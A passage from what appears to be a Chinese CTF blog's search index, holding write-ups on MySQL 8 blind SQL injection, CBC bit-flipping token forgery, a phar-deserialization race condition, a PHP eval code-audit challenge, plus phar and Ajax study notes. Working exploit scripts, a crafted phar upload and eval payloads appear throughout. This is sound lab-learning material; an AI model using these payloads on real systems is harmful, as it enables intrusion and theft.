# 手动测试第一个字段 id\n            # 结果:1\n\n            # 爆第二个字段 username\n            # 结果: w3lc0me_t0_m1n1lct5\n            # 16进制为 0x77336c63306d655f74305f6d316e316c637435\n            payload1 = &#123;\"username\": \"1\\\\\",\n                        \"password\": f\"||(1,&#123;str2hex(result+dic[j])&#125;,0x21)&lt;(table users limit 1);\\x00\"\n                        &#125;\n\n            # 爆第三个字段 password\n            # 结果:cd51c1005cab68be2f7e6112a4de3e88\n            # 因为最后一个字符完成后长度相等又判断为假 所以最后一个字符应为其下一个字母\n            # 但是这仅限最后一个字段\n            # 所以正确结果是cd51c1005cab68be2f7e6112a4de3e89\n            payload2 = &#123;\"username\": \"1\\\\\",\n                        \"password\": f\"||(1,0x77336c63306d655f74305f6d316e316c637435,&#123;str2hex(result+dic[j])&#125;)&lt;(table users limit 1);\\x00\"\n                        &#125;\n\n            res = requests.post(url=url, data=payload1)\n            # print(res.text)\n            if \"success\" in res.text:\n                continue\n            elif \"fail\" in res.text:\n                # 返回假时表示上一个字母即为正确结果\n                result += dic[j - 1]\n                break\n        print(result)\nif __name__ == '__main__':\n    boomSql()\n\n运行得到 username 和 password\n登录拿到flag\n\ncheckin题目分析打开题目告诉\nOnly admin can get the secret!\n\n然后仔细研究了一下这个token，发现最前面固定为 0001145141919810 ，然后…………..不会了\n后来给了源码，用go语言写的。当时go也没学过，简单学了一下，了解了下关键函数的作用。\n关键代码\n//User的结构\ntype User struct &#123;\n\tName     string\n\tCreateAt int64\n\tIP       string\n&#125;\n\n//初始化一个token\nfunc IndexController(c *gin.Context) &#123;\n\t_, err := c.Cookie(\"token\")\n\tif err == nil &#123;\n\t\tc.Redirect(http.StatusFound, \"/home\")\n\t&#125;\n    //token的结构，后面TokenDecrypt后的结构也是如此\n\tuser := models.User&#123;Name: \"guest\", CreateAt: time.Now().Unix(), IP: c.ClientIP()&#125;\n\tjsonUser, _ := json.Marshal(user)\n\ttoken, _ := utils.TokenEncrypt(jsonUser)\n\tc.SetCookie(\"token\", token, 3600, \"/\", \"\", false, true)\n\tc.Redirect(http.StatusFound, \"/home\")\n&#125;\n\nflagController.go文件：\nfunc HomeController(c *gin.Context) &#123;\n\ttoken, err := c.Cookie(\"token\")\n\tif err != nil &#123;\n\t\tc.Redirect(http.StatusFound, \"/\")\n\t&#125;\n\tjsonUser, _ := utils.TokenDecrypt(token)\n\tuser := models.User&#123;&#125;\n\t_ = json.Unmarshal([]byte(jsonUser), &amp;user)\n    //只要TokenDecrypt后的结构中的Name为admin就可拿到flag\n\tif user.Name == \"admin\" &#123;\n\t\tfile, _ := os.Open(\"/flag\")\n\t\tdefer file.Close()\n\t\tcontent, _ := ioutil.ReadAll(file)\n\t\t_, _ = c.Writer.WriteString(string(content))\n\t&#125; else &#123;\n\t\t_, _ = c.Writer.WriteString(\"Only admin can get the secret!\")\n\t&#125;\n&#125;\n\ntoken.go文件:\nvar key = []byte(config.KEY)\t//配置文件中的密钥（未知）但大小为16字节\nvar iv = []byte(config.IV)\t\t//CBC加密的初始向量 0001145141919810 （16字节）\n\ntype tokenError struct &#123;\n\terror string\n&#125;\n\nfunc (e *tokenError) Error() string &#123;\n\treturn e.error\n&#125;\n\n//对User进行CBC分组加密的函数\nfunc TokenEncrypt(user []byte) (string, error) &#123;\n\tblock, err := aes.NewCipher(key)\n\tif err != nil &#123;\n\t\treturn \"\", err\n\t&#125;\n\tblockSize := block.BlockSize()\t\t//密钥大小\n\toriginData := pad(user, blockSize)\t//根据密钥大小分组\n\tblockMode := cipher.NewCBCEncrypter(block, iv)\t//创建加密对象，包含密钥key和初始向量IV\n\tencrypted := make([]byte, len(originData))\t\t\n\tblockMode.CryptBlocks(encrypted, originData)\t//CBC算法，详情见后文\n\treturn base64.StdEncoding.EncodeToString(append([]byte(config.IV), encrypted...)), nil\t\t\t\t\t\t\t\t//base64编码\n&#125;\n//按16字节一组进行分组\nfunc pad(ciphertext []byte, blockSize int) []byte &#123;\n\tpadding := blockSize - len(ciphertext)%blockSize\n\tpadText := bytes.Repeat([]byte&#123;byte(padding)&#125;, padding)\n\treturn append(ciphertext, padText...)\n&#125;\n\n//CBC解密\nfunc TokenDecrypt(user string) (string, error) &#123;\n\tdecodeData, err := base64.StdEncoding.DecodeString(user)\n\tiv = decodeData[:16]\t\t//前16个字节为初始向量iv\n\tdecodeData = decodeData[16:]\t//后面为密文\n\tif err != nil &#123;\n\t\treturn \"\", &amp;tokenError&#123;\"Invalid token\"&#125;\n\t&#125;\n\tblock, _ := aes.NewCipher(key)\n\tblockMode := cipher.NewCBCDecrypter(block, iv)\n\toriginData := make([]byte, len(decodeData))\n\tblockMode.CryptBlocks(originData, decodeData)\n\tdecrypted, err := unPad(originData)\t\t//整合\n\tif err != nil &#123;\n\t\treturn \"\", &amp;tokenError&#123;\"padding error\"&#125;\n\t&#125;\n\treturn string(decrypted), nil\n&#125;\n//将多个原文组整合到一起\nfunc unPad(ciphertext []byte) ([]byte, error) &#123;\n\tlength := len(ciphertext)\n\tunPadding := int(ciphertext[length-1])\n\tif unPadding &lt; 1 || unPadding > 16 &#123;\n\t\treturn []byte(\"\"), &amp;tokenError&#123;\"padding error\"&#125;\n\t&#125;\n\tfor i := 0; i &lt; unPadding; i++ &#123;\n\t\tif int(ciphertext[length-i-1]) != unPadding &#123;\n\t\t\treturn []byte(\"\"), &amp;tokenError&#123;\"padding error\"&#125;\n\t\t&#125;\n\t&#125;\n\treturn ciphertext[:(length - unPadding)], nil\n&#125;\n\n然后…..又不知道怎么办了，感觉是密码学的问题。后来问了问 Carrot2 学长，提示了下是 CBC字节反转攻击 后面网上学习了一下，总算是解决了。\n前置知识CBC全称Cipher Block Chaining，密码分组链接模式\n大致的过程是：\n\n将原文分为若干组，每组的大小一般为初始向量IV的大小，后面不足则填充到相应的大小\n先将第一组与初始向量IV异或得到中间值，之后再用加密算法对中间值进行加密得到第一块Ciphertext，然后再用这块Ciphertext和第二块原文异或得到中间值，再对这个中间值加密得到第二块Ciphertext，后续操作亦是如此。\n将每一块Ciphertext整合得到最终密文(一般还可以在最终的密文前带上初始向量IV，checkin这题就是这样)\n\n解密反过来操作就行了，这里不再赘述\n详情请见 https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation\n加密过程\n\n解密过程\n\n从加密过程中可以看到，每个密文块都依赖于它前面所有的明文块，所以某一个密文块的变化会影响后一个区块解密后的原文\nCBC Bit-Flipping Attack在国内又被称为CBC字节翻转攻击，无论是翻转bit还是byte，本质上还是一致的，所以不必纠结中英文的不同。首先要知道该攻击发生在CBC的解密环节上。\n\n上图可以直观地看到，在解密过程里，通过翻转前一组密文里特定位置的bit，从而达到了翻转下一组明文里特定位置bit的效果。同样的，如果可以修改iv，那么也可以修改第一组解密出的明文内容（checkin这道题的解法就是这样）。\n进一步分析其原理 （参考 https://masterpessimistaa.wordpress.com/2017/05/03/cbc-bit-flipping-attack/  ）:\n\n从上图可以清楚得到：\nA &#x3D; P ^ BlockCipherDecryption(B)\n\n需要注意的是 BlockCipherDecryption(B)是一个常量，因为这里没有修改B\n对于分组的第n字节，相应地有：\nA[n] &#x3D; P[n] ^ BlockCipherDecryption(B[n]) \t\t\t\t\t&#x2F;&#x2F;式（1）\n\n变形得到：\nBlockCipherDecryption(B[n]) &#x3D; A[n] ^ P[n]\t\t\t\t\t&#x2F;&#x2F;式（2）\n\n在式(1)里，假定我们想要输出的明文P[n]为我们想要的明文，设为P1\n在式(2)里，假定输出的明文P[n]是密文未经过修改得到的真实明文，设为P2\n于是由式(1)式(2)得：\nA[n] &#x3D; P1 ^ A[n] ^ P2\n\n调整顺序：\nA[n] &#x3D; A[n] ^ P1 ^ P2\t\t\n\n可见，通过这种方式就可以修改密文达到翻转解密出的明文字节的效果。\n题解由题目源码可知是16个字节为一组，需要修改的 Name 正好在第一组，所以只需要修改初始向量 iv 使得 guest 变为 admin 即可\n由上文分析不难推出最终计算所需 iv 的公式为\nIV &#x3D; IV ^ admin ^ guest\t\t\t&#x2F;&#x2F;这里计算的是对应的一个字节\n\nexp:\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"time\"\n)\n\nvar iv = []byte(\"0001145141919810\")\n\ntype User struct &#123;\n\tName     string\n\tCreateAt int64\n\tIP       string\n&#125;\n\nfunc main() &#123;\n\n\tvar iv = []byte(\"0001145141919810\")\n\tuser := User&#123;Name: \"guest\", CreateAt: time.Now().Unix(), IP: \"127.0.0.1\"&#125;\n\tjsonUser, _ := json.Marshal(user)\n\tadmin := User&#123;Name: \"admin\", CreateAt: time.Now().Unix(), IP: \"127.0.0.1\"&#125;\n\tjsonAdmin, _ := json.Marshal(admin)\n\t//每一组为16个字节，修改第一组即可\n\tfor i := 0; i &lt; 16; i++ &#123;\n\t\tfmt.Print(string(iv[i] ^ jsonAdmin[i] ^ jsonUser[i]))\n\t&#125;\n&#125;\n\n运行得到所需iv为\n0001145147(9#&quot;10\n\n将原来token前面的iv( 0001145141919810 )替换为 0001145147(9#&quot;10 ，编码后发送，认证成功，拿到flag\ninclude很简单的签到题，这里不再赘述。\n参考链接https://www.codetd.com/article/13126014\nhttps://www.jianshu.com/p/f4684322e851\nhttps://dev.mysql.com/doc/refman/8.0/en/table.html\nhttps://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/\nhttps://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/\n","categories":["CTF-WP"],"tags":["SQL","CTF","mysql8","CBC"]},{"title":"2022DASCTF Apr X FATE-soeasy_php","url":"/2022/04/30/2022DASCTF-Apr-X-FATE-soeasy-php/","content":"自己的理解简单分析上周末dsactf的一道题，赛后自己自己看着作者的wp研究了一下，发现很多师傅都是用条件竞争打的，然后我在自己的机器上试了很多次都没结果，分析了一下，其实这道题用条件竞争读到flag是非预期，buuoj的平台不能一次性发送大量的包，否则会429错误。而且不难发现它这个edit.php可以使用条件竞争的地方还是要经过大量的调试的\nedit.php:\n&lt;?php\nini_set(\"error_reporting\",\"0\");\nclass flag&#123;\n    public function copyflag()&#123;\n        exec(\"/copyflag\"); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt\n        echo \"SFTQL\";\n    &#125;\n    public function __destruct()&#123;\n        $this->copyflag();\n    &#125;\n\n&#125;\n\nfunction filewrite($file,$data)&#123;\n        unlink($file);\n        file_put_contents($file, $data);\n&#125;\n\n\nif(isset($_POST['png']))&#123;\n    $filename = $_POST['png'];\n    if(!preg_match(\"/:|phar|\\/\\/|php/im\",$filename))&#123;\n        $f = fopen($filename,\"r\");\n        $contents = fread($f, filesize($filename));\n        if(strpos($contents,\"flag&#123;\") !== false)&#123;\n            filewrite($filename,\"Don't give me flag!!!\");\n        &#125;\n    &#125;\n\n    if(isset($_POST['flag'])) &#123;\n        $flag = (string)$_POST['flag'];\n        if ($flag == \"Give me flag\") &#123;\n            filewrite(\"/tmp/flag.txt\", \"Don't give me flag\");\n            sleep(2);\n            die(\"no no no !\");\n        &#125; else &#123;\n            filewrite(\"/tmp/flag.txt\", $flag);  //不给我看我自己写个flag。\n        &#125;\n        $head = \"uploads/head.png\";\n        unlink($head);                          //“删除文件”,即解除与\"uploads/head.png\"的软链接\n        if (symlink($filename, $head)) &#123;        //可以使symlink()报错返回false从而运行unlink()从而可以phar反序列化执行__destruct()\n            echo \"成功更换头像\";\n        &#125; else &#123;\n            unlink($filename);\n            echo \"非正常文件，已被删除\";\n        &#125;;\n    &#125;\n&#125;\n\n这里的思路是：\n\n利用文件上传上传 phar文件\n\n写入超长文件名使得 symlink()函数出错返回 false\n\nunlink()触发 phar 反序列化将flag写入到可读的 /tmp/flag.txt 处\n\n建立与 /tmp/flag.txt 与 uploads/head.png 的软连接\n\n在建立与 /tmp/flag.txt 的软链接之前程序会将原来写入的flag给覆盖掉。所以要在覆盖flag后，另一个线程已经在copy /falg到 /tmp/flag.txt，这样 /uploads/head.png与/tmp/flag.txt建立了链接，同时flag也没有被覆盖，然后访问 /uploads/head.png读取即可。\n\n\n这里难点就是要抓住这个时机\nexp# 本脚本来自Carrot2\nimport random\nfrom multiprocessing import Process\nimport requests\nimport time\n\nsession = requests.session()\n\nproxies = &#123;\n    \"http\": \"http://127.0.0.1:8080\",\n    \"https\": \"http://127.0.0.1:8080\"\n&#125;\nurl = \"http://3f33abdf-13d3-41ad-8449-99748055ffda.node4.buuoj.cn:81\"\n\ndef fun1():\n    global url, burp0_headers\n    # time.sleep(1)\n    burp0_url = url + '/edit.php'\n    burp0_data = &#123;\n        \"png\": \"phar://uploads/fe409167fb98b72dcaff5486a612a575.png/test.txt/\" + 'x' * 5000,\n        \"flag\": \"flag&#123;x&#125;\"&#125;\n    print(1, time.time_ns())\n    r = session.post(burp0_url, data=burp0_data, proxies=proxies)\n    print(1, time.time_ns(), r.elapsed)\n    # print(r.text)\n\n\ndef fun2():\n    global url, burp0_headers\n    burp0_url = url + '/edit.php'\n    burp0_data = &#123;\n        \"png\": \"/tmp/flag.txt\",\n        \"flag\": \"G\"\n    &#125;\n    time.sleep(random.random() / 7)\n    print(2, time.time_ns())\n    r = session.post(burp0_url, data=burp0_data, proxies=proxies)\n    print(2, time.time_ns(), r.elapsed)\n\n\ndef fun3():\n    global url, burp0_headers\n    burp0_url = url + '/uploads/head.png'\n    r = session.get(burp0_url, proxies=proxies)\n\n\ndef fun0():\n    global url\n    burp0_url = url + \"/upload.php\"\n    burp0_headers = &#123;\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\",\n                     \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\",\n                     \"Content-Type\": \"multipart/form-data; boundary=---------------------------33274515982456441596545310848\"&#125;\n    burp0_data = \"-----------------------------33274515982456441596545310848\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"phar.phar\\\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n&lt;?php __HALT_COMPILER(); ?>\\r\\nE\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x0f\\x00\\x00\\x00O:4:\\\"flag\\\":0:&#123;&#125;\\x08\\x00\\x00\\x00test.txt\\x04\\x00\\x00\\x007\\x88cb\\x04\\x00\\x00\\x00\\x0c~\\xd8\\xb6\\x01\\x00\\x00\\x00\\x00\\x00\\x00test^p\\xef\\x02_\\x1d\\x8e\\xa2\\xf9\\xbe\\x95\\xbc\\xba&lt;\\xb7AbB\\xfdD\\x02\\x00\\x00\\x00GBMB\\r\\n-----------------------------33274515982456441596545310848--\\r\\n\"\n    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)\n\n\nif __name__ == '__main__':\n    fun0()\n    process_list = []\n    for i in range(50):\n        p1 = Process(target=fun1, )\n\n        process_list.append(p1)\n        p2 = Process(target=fun2, )\n\n        process_list.append(p2)\n        p3 = Process(target=fun3, )\n\n        process_list.append(p3)\n\n        p1.start()\n        p2.start()\n        time.sleep(0.5)\n        p3.start()\n        time.sleep(1)\n\n设置了代理，进bp盯着就行了。\n注意:该题的利用条件竞争读取的概率还是有点低的，受环境影响，这个时间差要自己多次调试才能成功。\n出题人的wp这里附上出题人的解法。(很全面)\nhttp://max666.fun/21.html\n","categories":["CTF-WP"],"tags":["phar","条件竞争"]},{"title":"phar反序列化学习笔记","url":"/2022/04/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"前言上周末的比赛有一道题要用phar反序列化，结果当时不会。。。还是学的太少了。\nphar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar:&#x2F;&#x2F;伪协议，可以不依赖unserialize()直接进行反序列化操作\nphar文件结构phar本质上其实就是种压缩文件，它主要由四部分构成\n1.Phar file stub (头部标识)可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。\n2. Phar manifest file entry definition （内容清单）phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。（可以序列化就可以反序列化）\n\n3. the file contents被压缩的文件内容\n4. [optional] a signature for verifying Phar integrity (phar file format only)文件签名，在文件末尾，格式：\n\ndemo测试根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。\n注意：要将php.ini中的 phar.readonly选项设置为Off，否则无法生成phar文件。\n\nphar_generate.php :\n&lt;?php\n    class TestObject &#123;\n    &#125;\n\n    @unlink(\"phar.phar\");\n    $phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n    $phar->startBuffering();\n    $phar->setStub(\"&lt;?php __HALT_COMPILER(); ?>\"); //设置stub\n    $o = new TestObject();\n    $phar->setMetadata($o); //将自定义的meta-data存入manifest\n    $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n    //签名自动计算\n    $phar->stopBuffering();\n\n运行，打开查看生成的 phar.phar 文件\n可以明显的看到meta-data是以序列化的形式存储的：\n\n既然有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：\n\n具体的底层原理这里不再探究\n本地测试下如何利用 phar 反序列化\ntest_11.php :\n&lt;?php \n    class TestObject &#123;\n        public function __destruct() &#123;\n            echo '_destruct() called!';\n        &#125;\n    &#125;\n\n    $filename = 'phar://phar.phar/test.txt';\n    file_get_contents($filename); \n\t//unlink($filename);\n\n运行结果:\n\n当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作。\nphar反序列化通常与文件上传共同作用。\n将phar伪造成其他格式的文件在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。\n&lt;?php\n    class TestObject &#123;\n    &#125;\n\n    @unlink(\"phar.phar\");\n    $phar = new Phar(\"phar.phar\");\n    $phar->startBuffering();\n    $phar->setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?>\"); //设置stub，增加gif文件头\n    $o = new TestObject();\n    $phar->setMetadata($o); //将自定义meta-data存入manifest\n    $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n    //签名自动计算\n    $phar->stopBuffering();\n\n采用这种方法可以绕过很大一部分上传检测。\n利用条件\nphar文件要能够上传到服务器端。\n要有可用的魔术方法作为“跳板”。\n文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。\n\n参考链接https://paper.seebug.org/680/#22-demo\n","categories":["web安全基础"],"tags":["phar","php"]},{"title":"2022DASCTF Apr X FATE warmup-php复现","url":"/2022/04/26/2022DASCTF-Apr-X-FATE-warmup-php%E5%A4%8D%E7%8E%B0/","content":"是一道算不上太难的php代码审计题\n不过当时做的时候还是暴漏出自己的很多问题  像竟然不会post传数组\n打开题目拿到审计下源码\n&lt;?php\nspl_autoload_register(function($class)&#123;\n    require(\"./class/\".$class.\".php\");\n&#125;);\nhighlight_file(__FILE__);\nerror_reporting(0);\n$action = $_GET['action'];\n$properties = $_POST['properties'];\nclass Action&#123;\n\n    public function __construct($action,$properties)&#123;\n\n        $object=new $action();\n        foreach($properties as $name=>$value)\n            $object->$name=$value;\n        $object->run();\n    &#125;\n&#125;\n\nnew Action($action,$properties);\n?>\n\n这里有个 run() 函数可以触发，接着可以审计附件中的源码。\n先去找这个 run() 函数，可以在 ListView.php 这个文件里发现\n\n同时可以发现这几个类之间是继承的关系，所以在最后的 TestView.php 中可以使用上面文件中继承的类的属性和方法。执行 run() 函数后又执行 renderContent() 函数，那跳转到这个函数看一下\n\n这个函数执行一个正则匹配（这里表示匹配 &#123;&#125;及大括号里面的内容），当匹配到时则给回调函数去处理，template 是要匹配的字符串，第一个参数是匹配规则，中间的函数是回调函数（调用类中的函数的时是可以是使用数组的调用形式的，如上述的 array($this,&#39;renderSection&#39;) 就是表示调用当前类中的renderSection函数 ）。\n来看看 renderSection 这个函数\n\n拿到正则匹配好的字符串，$matchers[1] 表示匹配 {} 里面的内容，可以本地测试一下\n如这串代码\n&lt;?php\nclass test &#123;\n    function fun1($matches) &#123;\n        echo $matches[0];\n        echo '&lt;/br>';\n        echo $matches[1];\n    &#125;\n&#125;\n$a = new test();\necho preg_replace_callback(\"/&#123;(\\w+)&#125;/\",array($a,'fun1'),\"&#123;123&#125;\");\n\n最终输出结果\n\n所以这里可以传一个参数，让它和字符串 render 拼接后形成一个全新的字符串，接着执行 $this-&gt;$method() 。这里是我们可以控制的，关键是找到以 render 开头且没有参数的函数。\n找下可以利用的函数，可以发现有很多。不急，可以看看其它的，在 base.php 中发现了一个十分危险的函数\n\n所以这个 evaluateExpression 函数是关键，那么结合上文的条件，我们就可以锁定这里的代码\nTestView.php 中\npublic function renderTableRow($row)\n    &#123;\n        $htmlOptions=array();\n        if($this->rowHtmlOptionsExpression!==null)\n        &#123;\n            $data=$this->data[$row];\n            $options=$this->evaluateExpression($this->rowHtmlOptionsExpression,array('row'=>$row,'data'=>$data));\n            if(is_array($options))\n                $htmlOptions = $options;\n        &#125;\n\n        if($this->rowCssClassExpression!==null)\n        &#123;\n            $data=$this->dataProvider->data[$row];\n            $class=$this->evaluateExpression($this->rowCssClassExpression,array('row'=>$row,'data'=>$data));\n        &#125;\n        elseif(is_array($this->rowCssClass) &amp;&amp; ($n=count($this->rowCssClass))>0)\n            $class=$this->rowCssClass[$row%$n];\n\n        if(!empty($class))\n        &#123;\n            if(isset($htmlOptions['class']))\n                $htmlOptions['class'].=' '.$class;\n            else\n                $htmlOptions['class']=$class;\n        &#125;\n    &#125;\n    public function renderTableBody()\n    &#123;\n        $data=$this->data;\n        $n=count($data);\n        echo \"&lt;tbody>\\n\";\n\n        if($n>0)\n        &#123;\n            for($row=0;$row&lt;$n;++$row)\n                $this->renderTableRow($row);\n        &#125;\n        else\n        &#123;\n            echo '&lt;tr>&lt;td colspan=\"'.count($this->columns).'\" class=\"empty\">';\n\n            echo \"&lt;/td>&lt;/tr>\\n\";\n        &#125;\n        echo \"&lt;/tbody>\\n\";\n    &#125;\n\n这里 renderTableBody 函数满足以字符串 render 开头，且无参数，还可以去调用 renderTableRow($row)函数从而有办法去执行 evaluateExpression 函数，所以可以构造 template=&quot;&#123;TableBody&#125;&quot;。这里 data 参数应为一个数组可以构造 data=array(1)。在 renderTableRow($row)函数中，参数 rowHtmlOptionsExpression为我们要在 eval 函数中的字符串。\n回到一开始的代码\nhighlight_file(__FILE__);\nerror_reporting(0);\n$action = $_GET['action'];\n$properties = $_POST['properties'];\nclass Action&#123;\n\n    public function __construct($action,$properties)&#123;\n\n        $object=new $action();\n        foreach($properties as $name=>$value)\n            $object->$name=$value;\n        $object->run();\n    &#125;\n&#125;\n\nnew Action($action,$properties);\n?>\n\n参数 action 为要创建的对象，从上文分析可知所需改变的参数都在 TestView 这个类中，所以需要 new 一个TestView 对象，即 GET 传参 ?action=TestView\n构造函数中使用for循环给 TestView 对象中的某些属性赋值，这里我们按照上文分析的那样给它赋值\n注意这里传的参数是数组类型，传递数组的格式是 property[key]=vale 传递二维数组是两个[]，以此类推\n这些参数都可以通过post传参来控制，所以POST的payload:\nproperties[template]=&#123;TableBody&#125;&amp;properties[data][]=1&amp;properties[rowHtmlOptionsExpression]=phpinfo()\n\n结果\n\n可以继续执行 system() 函数拿到flag。注意像 phpinfo() ，system() 这类的函数一般只要是执行了就会有会显的。\n这次比赛还有道 phar反序列化+条件竞争的题，后面有时间再写。\n","categories":["CTF-WP"],"tags":["php","代码审计"]},{"title":"Ajax学习笔记","url":"/2022/04/25/Ajax%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"AjaxAjax介绍AJAX是异步的JavaScript和XML（Asynchronous JavaScript And XML）。简单点说，就是使用 XMLHttpRequest 对象与服务器通信。 它可以使用JSON，XML，HTML和text文本等格式发送和接收数据。AJAX最吸引人的就是它的“异步”特性，也就是说它可以在不重新刷新页面的情况下与服务器通信，交换数据，或更新页面。\n可以使用AJAX最主要的两个特性做下列事：\n\n在不重新加载页面的情况下发送请求给服务器。\n接受并使用从服务器发来的数据。\n\n0x01 怎样发起http请求//创建一个XHR对象\nvar httpRequest = new XMLHttpRequest();\n\n发送一个请求后，你会收到响应。你要告诉XMLHttp请求对象是由哪一个js函数处理响应，在设置了对象的 onreadystatechange 属性后给他命名，当请求状态改变时调用函数。\nhttpRequest.onreadystatechange = nameOfTheFunction;\n\n要注意的是，函数名后没有参数，因为把一个引用赋值给了函数，而不是真正的调用了它。 此外，如果不使用函数名的方式，你还可以用JavaScript的匿名函数响应处理的动作，就像下面这样：\nhttpRequest.onreadystatechange = function()&#123;\n    // Process the server response here.\n&#125;;\n\n接下来，声明当你接到响应后要做什么，要发送一个实际的请求，通过调用HTTP请求对象的 open() 和 send() 方法，像下面这样:\nhttpRequest.open('GET', 'http://www.example.org/some.file', true);\nhttpRequest.send();\n\ndata = \"something....\";\nhttpRequest.open('POST', 'http://www.example.org/some.file', true);\nhttpRequest.send(data);\n\n\nopen() 的第一个参数是HTTP请求方法 - 有GET，POST，HEAD以及服务器支持的其他方法。 保证这些方法一定要是大写字母，否则其他一些浏览器（比如FireFox）可能无法处理这个请求。\n第二个参数是你要发送的URL。由于安全原因，默认不能调用第三方URL域名。 确保你在页面中使用的是正确的域名，否则在调用 open() 方法是会有 “permission denied” 错误提示。一个容易犯的错误是企图通过 domain.tld 访问网站， 而不是使用 www.domain.tld。\n第三个参数是可选的，用于设置请求是否是异步的。如果设为 true (默认值)，即开启异步，JavaScript就不会在此语句阻塞，使得用户能在服务器还没有响应的情况下与页面进行交互。\n\nsend() 方法的参数可以是任何你想发送给服务器的内容，如果是 POST 请求的话。发送表单数据时应该用服务器可以解析的格式，像查询语句：\n\"name=value&amp;anothername=\"+encodeURIComponent(myVar)+\"&amp;so=on\"\n\n或者其他格式, 类似 multipart/form-data，JSON，XML等。\n如果你使用 POST 数据，那就需要设置请求的MIME类型。比如，在调用 send() 方法获取表单数据前要有下面这个：\nhttpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n\n0x02 处理服务器响应在发送请求时，提供的JavaScript函数名负责处理响应：\nhttpRequest.onreadystatechange = nameOfTheFunction;\n\n这个函数应该做什么？首先，函数要检查请求的状态。可以通过检查返回的状态码 200 OK 来判断AJAX是否成功\nif (httpRequest.status === 200) &#123;\n    // Perfect!\n&#125; else &#123;\n    // There was a problem with the request.\n    // For example, the response may have a 404 (Not Found)\n    // or 500 (Internal Server Error) response code.\n&#125;\n\n在检查完请求状态和HTTP响应码后， 就可以用服务器返回的数据做任何你想做的了。你有两个方法去访问这些数据：\n\nhttpRequest.responseText – 服务器以文本字符的形式返回\nhttpRequest.responseXML – 以 XMLDocument 对象方式返回，之后就可以使用JavaScript来处理\n\n注意上面这一步只在发起异步请求时有效（即 open() 的第三个参数未特别指定或设为 true）。如果发起的是同步请求则不必使用函数，但是非常不推荐这样子做，它的体验很糟糕。\n0x03 简单的列子前端使用Ajax发送用户名和密码\n&lt;!DOCTYPE html>\n&lt;html>\n    &lt;head>\n        &lt;meta charset=\"utf-8\">\n        &lt;title>ajax and node study&lt;/title>\n    &lt;/head>\n    &lt;body>\n        &lt;h3>你好，欢迎访问&lt;/h3>\n        &lt;p>请输入您的用户名和密码&lt;/p>\n        &lt;form name=\"myForm\">\n            &lt;input name=\"username\" id=\"username\" type=\"text\" style=\"display: flex;\">\n            &lt;input name=\"passwd\" id=\"passwd\" type=\"password\">\n            &lt;input id=\"submit\" type=\"button\" value=\"login\" style=\"display: flex;\">\n        &lt;/form>\n        &lt;script>\n            document.getElementById('submit').onclick = sendMsg;\n            function sendMsg() &#123;\n                var username = document.getElementById('username').value;\n                var passwd = document.getElementById('passwd').value;\n                //创建一个xhr对象\n                var xhr = new XMLHttpRequest();\n                //开启访问  这里使用POST方法\n                xhr.open('POST', 'http://localhost:8000');\n                //发送数据\n                xhr.send(`username: $&#123;username&#125; passwd: $&#123;passwd&#125;`);\n                alert('已发送');\n            &#125;\n        &lt;/script>\n    &lt;/body>\n&lt;/html>\n\n后端代码\nconst http = require('http');\nconst fs = require('fs');\nrecv = ''\nconst server = http.createServer((req, res) => &#123;\n    //设置CORS头部允许从http://127.0.0.1:5500跨域请求http://localhost:8000\n    res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:5500');\n    req.on('data', (data) => &#123;\n        recv += data;\n    &#125;);\n    res.end(recv);\n&#125;);\nserver.listen(8000);\nconsole.log('访问 http://localhost:8000');\n\n运行结果\n\n使用Ajax在浏览器中是默认不允许进行跨域访问的（若服务端未设置Access-Control-Allow-Orign头部），但值得注意的是，事实上服务端还是收到了来自客户端的数据了的，只是浏览器返回给用户一个CORS错误。\n这里向服务器跨域发送，发现在浏览器会报错\n\n但服务器依旧是收到了来自客户端的数据\n\n0x04 小结Ajax在异步处理中占据着举足轻重的地位，向在XSS中可向自己的服务器发送相关的数据等等。当然，有关XMLHttpRequest的更多用法这里还未提及，需要自己去探索\n","categories":["前端"],"tags":["js","Ajax","前端"]},{"title":"*CTF 